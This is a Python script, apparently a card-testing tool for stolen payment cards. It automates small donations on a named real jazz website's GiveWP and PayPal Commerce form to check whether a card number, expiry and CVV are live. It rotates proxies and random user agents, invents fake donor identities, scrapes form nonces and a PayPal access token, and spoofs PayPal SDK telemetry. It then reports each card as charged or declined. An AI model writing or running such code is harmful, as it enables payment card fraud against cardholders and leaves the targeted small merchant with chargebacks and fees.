import requests
import re
import base64
import json
import random
import asyncio
from typing import Optional
from faker import Faker
from user_agent import generate_user_agent
from urllib.parse import quote

fake = Faker()

def parse_proxy(proxy_str: str) -> Optional[str]:
    if not proxy_str:
        return None
    clean_proxy = proxy_str.replace("http://", "").replace("https://", "")
    parts = clean_proxy.split(':')
    if len(parts) >= 4 and parts[1].isdigit():
        host, port = parts[0], parts[1]
        user = quote(parts[2], safe='')
        pwd = quote(':'.join(parts[3:]), safe='')
        return f"http://{user}:{pwd}@{host}:{port}"
    elif len(parts) == 2 and parts[1].isdigit():
        return f"http://{clean_proxy}"
    return proxy_str

def gdata():
    fnames = ["john","james","robert","michael","william","david","richard","joseph","thomas","charles"]
    lnames = ["smith","johnson","williams","brown","jones","garcia","miller","davis","rodriguez","martinez"]
    domains = ["gmail.com","yahoo.com","outlook.com","hotmail.com","protonmail.com","icloud.com"]
    f = random.choice(fnames)
    l = random.choice(lnames)
    num = random.randint(10, 999)
    email = f"{f}.{l}{num}@{random.choice(domains)}"
    name = f"{f.capitalize()} {l.capitalize()}"
    add = f"{random.randint(100,9999)} {random.choice(['Main','Oak','Pine','Maple','Cedar'])} St"
    city = random.choice(["New York","Los Angeles","Chicago","Houston","Phoenix"])
    zip_code = str(random.randint(10000, 99999))
    phone = f"+1{random.randint(200,999)}{random.randint(100,999)}{random.randint(1000,9999)}"
    return email, name, add, city, zip_code, phone

def _run_paypal_charge_sync(cc: str, mes: str, ano: str, cvv: str, proxy_str: Optional[str] = None):
    session = requests.Session()
    if proxy_str:
        proxy_url = parse_proxy(proxy_str)
        if proxy_url:
            session.proxies = {
                'http': proxy_url,
                'https': proxy_url
            }

    email, name, add, city, zip_code, phone = gdata()
    u = generate_user_agent()

    # 1. Fetch form
    try:
        resp = session.get('https://jazzonthetube.com/video/support-jazz-on-the-tube/', headers={'User-Agent': u}, timeout=15)
        html = resp.text
        v1 = re.search(r'name="give-form-id-prefix" value="([^"]+)"', html).group(1)
        v2 = re.search(r'name="give-form-id" value="([^"]+)"', html).group(1)
        x1 = re.search(r'name="give-form-hash" value="([^"]+)"', html).group(1)
        x23 = re.search(r'"data-client-token":"([^"]+)"', html).group(1)
        
        x24 = base64.b64decode(x23).decode()
        x25 = json.loads(x24)
        access_token = x25['paypal']['accessToken']
    except Exception as exc:
        return False, f"Failed to retrieve form nonces: {str(exc)}"

    headers = {
        'Accept': '*/*',
        'Accept-Language': 'en-US,en;q=0.9',
        'Connection': 'keep-alive',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Origin': 'https://jazzonthetube.com',
        'Referer': 'https://jazzonthetube.com/video/support-jazz-on-the-tube/',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': u,
        'X-Requested-With': 'XMLHttpRequest',
    }

    data = {
        'give-honeypot': '',
        'give-form-id-prefix': v1,
        'give-form-id': v2,
        'give-form-title': 'One Time Donation',
        'give-current-url': 'https://jazzonthetube.com/video/support-jazz-on-the-tube/',
        'give-form-url': 'https://jazzonthetube.com/video/support-jazz-on-the-tube/',
        'give-form-minimum': '5.00',
        'give-form-maximum': '999999.99',
        'give-form-hash': x1,
        'give-price-id': 'custom',
        'give-recurring-logged-in-only': '',
        'give-logged-in-only': '1',
        'give_recurring_donation_details': '{"is_recurring":false}',
        'give-amount': '5.00',
        'give-radio-donation-level': 'custom',
        'give_stripe_payment_method': '',
        'payment-mode': 'paypal-commerce',
        'give_first': name.split()[0],
        'give_last': name.split()[1] if len(name.split()) > 1 else name,
        'give_company_option': 'no',
        'give_company_name': '',
        'give_email': email,
        'card_name': name,
        'card_exp_month': '',
        'card_exp_year': '',
        'billing_country': 'US',
        'card_address': add,
        'card_address_2': '',
        'card_city': city,
        'card_state': 'NY',
        'card_zip': zip_code,
        'give_action': 'purchase',
        'give-gateway': 'paypal-commerce',
        'action': 'give_process_donation',
        'give_ajax': 'true',
    }

    try:
        session.post('https://jazzonthetube.com/video/wp-admin/admin-ajax.php', cookies=session.cookies, headers=headers, data=data, timeout=20)
    except Exception as exc:
        return False, f"Donation processing failed: {str(exc)}"

    headers_order = {
        'Accept': '*/*',
        'Accept-Language': 'en-US,en;q=0.9',
        'Connection': 'keep-alive',
        'Origin': 'https://jazzonthetube.com',
        'Referer': 'https://jazzonthetube.com/video/support-jazz-on-the-tube/',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': u,
    }

    params = {
        'action': 'give_paypal_commerce_create_order',
    }

    files = {
        'give-honeypot': (None, ''),
        'give-form-id-prefix': (None, v1),
        'give-form-id': (None, v2),
        'give-form-title': (None, 'One Time Donation'),
        'give-current-url': (None, 'https://jazzonthetube.com/video/support-jazz-on-the-tube/'),
        'give-form-url': (None, 'https://jazzonthetube.com/video/support-jazz-on-the-tube/'),
        'give-form-minimum': (None, '5.00'),
        'give-form-maximum': (None, '999999.99'),
        'give-form-hash': (None, x1),
        'give-price-id': (None, 'custom'),
        'give-recurring-logged-in-only': (None, ''),
        'give-logged-in-only': (None, '1'),
        'give_recurring_donation_details': (None, '{"is_recurring":false}'),
        'give-amount': (None, '5.00'),
        'give-radio-donation-level': (None, 'custom'),
        'give_stripe_payment_method': (None, ''),
        'payment-mode': (None, 'paypal-commerce'),
        'give_first': (None, name),
        'give_last': (None, name),
        'give_company_option': (None, 'no'),
        'give_company_name': (None, ''),
        'give_email': (None, email),
        'card_name': (None, name),
        'card_exp_month': (None, ''),
        'card_exp_year': (None, ''),
        'billing_country': (None, 'US'),
        'card_address': (None, add),
        'card_address_2': (None, ''),
        'card_city': (None, city),
        'card_state': (None, 'NY'),
        'card_zip': (None, zip_code),
        'give-gateway': (None, 'paypal-commerce'),
    }

    try:
        resp_order = session.post(
            'https://jazzonthetube.com/video/wp-admin/admin-ajax.php',
            params=params,
            cookies=session.cookies,
            headers=headers_order,
            files=files,
            timeout=20
        )
        order_json = resp_order.json()
        xdata = order_json['data']['id']
    except Exception as exc:
        return False, f"Failed to create order: {str(exc)}"

    headers_options = {
        'authority': 'cors.api.paypal.com',
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9',
        'access-control-request-headers': 'authorization,braintree-sdk-version,content-type,paypal-client-metadata-id',
        'access-control-request-method': 'POST',
        'origin': 'https://assets.braintreegateway.com',
        'referer': 'https://assets.braintreegateway.com/',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': u,
    }

    try:
        session.options(
            f'https://cors.api.paypal.com/v2/checkout/orders/{xdata}/confirm-payment-source',
            headers=headers_options,
            timeout=10
        )
    except Exception:
        pass

    headers_confirm = {
        'authority': 'cors.api.paypal.com',
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9',
        'authorization': f'Bearer {access_token}',
        'braintree-sdk-version': '3.32.0-payments-sdk-dev',
        'content-type': 'application/json',
        'origin': 'https://assets.braintreegateway.com',
        'referer': 'https://assets.braintreegateway.com/',
        'sec-ch-ua-mobile': '?1',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': u,
    }

    # Normalize Expiry
    exp_year = str(ano)
    if len(exp_year) == 2:
        exp_year = "20" + exp_year
    exp_month = str(mes).zfill(2)
    expiry_str = f"{exp_year}-{exp_month}"

    json_confirm = {
        'payment_source': {
            'card': {
                'number': cc,
                'expiry': expiry_str,
                'security_code': cvv,
                'attributes': {
                    'verification': {
                        'method': 'SCA_WHEN_REQUIRED',
                    },
                },
            },
        },
        'application_context': {
            'vault': False,
        },
    }

    try:
        resp_confirm = session.post(
            f'https://cors.api.paypal.com/v2/checkout/orders/{xdata}/confirm-payment-source',
            headers=headers_confirm,
            json=json_confirm,
            timeout=20
        )
        confirm_data = resp_confirm.json()
        
        # Check decline or issues in confirm-payment-source
        if 'name' in confirm_data and confirm_data['name'] == 'UNPROCESSABLE_ENTITY':
            details = confirm_data.get('details', [])
            if details:
                err_msg = details[0].get('description', 'Unprocessable Entity')
                return False, err_msg
            return False, "Unprocessable Entity"
        elif 'error' in confirm_data:
            return False, confirm_data.get('error_description', 'Decline / Card validation failure')
    except Exception as exc:
        return False, f"Payment source confirmation error: {str(exc)}"

    headers_logger = {
        'authority': 'www.paypal.com',
        'accept': 'application/json',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/json',
        'origin': 'https://jazzonthetube.com',
        'referer': 'https://jazzonthetube.com/',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': u,
    }

    json_logger = {
        'events': [
            {
                'level': 'info',
                'event': 'HOSTEDFIELDS_SUBMIT',
                'payload': {
                    'env': 'production',
                    'csnwCorrelationId': 'prebuild',
                    'referrer': 'jazzonthetube.com',
                    'version': '5.0.556',
                    'merchantId': [],
                    'userAction': 'commit',
                    'loadedInFrame': 'non_paypal',
                },
            },
        ],
        'meta': {},
        'tracking': [
            {
                'state_name': 'CARD_PAYMENT_FORM',
                'transition_name': 'process_receive_order',
                'context_type': 'Cart-ID',
                'context_id': xdata,
                'context_correlation_id': 'prebuild',
                'serverside_data_source': 'checkout',
                'feed_name': 'payments_sdk',
                'js_sdk_library': 'paypal-js',
                'locale': 'en_US',
                'pp_placement': 'none',
                'bn_code': 'GiveWP_SP_PPCPV2',
                'referer_url': 'jazzonthetube.com',
                'sdk_integration_source': 'none',
                'sdk_name': 'payments_sdk',
                'sdk_version': '5.0.556',
                'seller_id': '',
                'user_action': 'commit',
                'user_agent': u,
                'loaded_in_frame': 'non_paypal',
            },
        ],
        'metrics': [],
    }

    try:
        session.post('https://www.paypal.com/xoplatform/logger/api/logger', params={'disableSetCookie': 'true'}, headers=headers_logger, json=json_logger, timeout=10)
    except Exception:
        pass

    headers_approve = {
        'Accept': '*/*',
        'Accept-Language': 'en-US,en;q=0.9',
        'Connection': 'keep-alive',
        'Origin': 'https://jazzonthetube.com/video/',
        'Referer': 'https://jazzonthetube.com/video/support-jazz-on-the-tube/',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': u,
    }

    params_approve = {
        'action': 'give_paypal_commerce_approve_order',
        'order': xdata,
    }

    files_approve = {
        'give-honeypot': (None, ''),
        'give-form-id-prefix': (None, v1),
        'give-form-id': (None, v2),
        'give-form-title': (None, 'One time donation'),
        'give-current-url': (None, 'https://jazzonthetube.com/video/'),
        'give-form-url': (None, 'https://jazzonthetube.com/video/'),
        'give-form-minimum': (None, '7'),
        'give-form-maximum': (None, '1000000'),
        'give-form-hash': (None, x1),
        'give-price-id': (None, 'custom'),
        'give-recurring-logged-in-only': (None, ''),
        'give-logged-in-only': (None, '1'),
        'give_recurring_donation_details': (None, '{"is_recurring":false}'),
        'give-amount': (None, '7'),
        'give-radio-donation-level': (None, 'custom'),
        'give_stripe_payment_method': (None, ''),
        'payment-mode': (None, 'paypal-commerce'),
        'give_first': (None, name),
        'give_last': (None, name),
        'give_company_option': (None, 'no'),
        'give_company_name': (None, ''),
        'give_email': (None, email),
        'card_name': (None, name),
        'card_exp_month': (None, ''),
        'card_exp_year': (None, ''),
        'billing_country': (None, 'US'),
        'card_address': (None, add),
        'card_address_2': (None, ''),
        'card_city': (None, city),
        'card_state': (None, 'NY'),
        'card_zip': (None, zip_code),
        'give-gateway': (None, 'paypal-commerce'),
    }

    try:
        resp_approve = session.post(
            'https://jazzonthetube.com/video/wp-admin/admin-ajax.php',
            params=params_approve,
            cookies=session.cookies,
            headers=headers_approve,
            files=files_approve,
            timeout=25
        )
        resp_text = resp_approve.text
        
        # Determine success
        if "donation_id" in resp_text or "success" in resp_text.lower():
            return True, "CARD_CHARGED_SUCCESS"
        
        # Try to parse JSON response if it returned JSON
        try:
            res_json = resp_approve.json()
            if res_json.get('success') is True:
                return True, "CARD_CHARGED_SUCCESS"
            if 'data' in res_json and isinstance(res_json['data'], str):
                return False, res_json['data']
        except Exception:
            pass

        # Cleanup HTML tags if returned HTML
        clean_err = re.sub(r'<[^>]+>', ' ', resp_text).strip()
        clean_err = re.sub(r'\s+', ' ', clean_err)
        if len(clean_err) > 150:
            clean_err = clean_err[:147] + "..."
        return False, clean_err or "Order approval failed"
    except Exception as exc:
        return False, f"Approval request error: {str(exc)}"

async def process_paypal_charge(cc: str, mes: str, ano: str, cvv: str, proxy_str: Optional[str] = None):
    return await asyncio.to_thread(_run_paypal_charge_sync, cc, mes, ano, cvv, proxy_str)
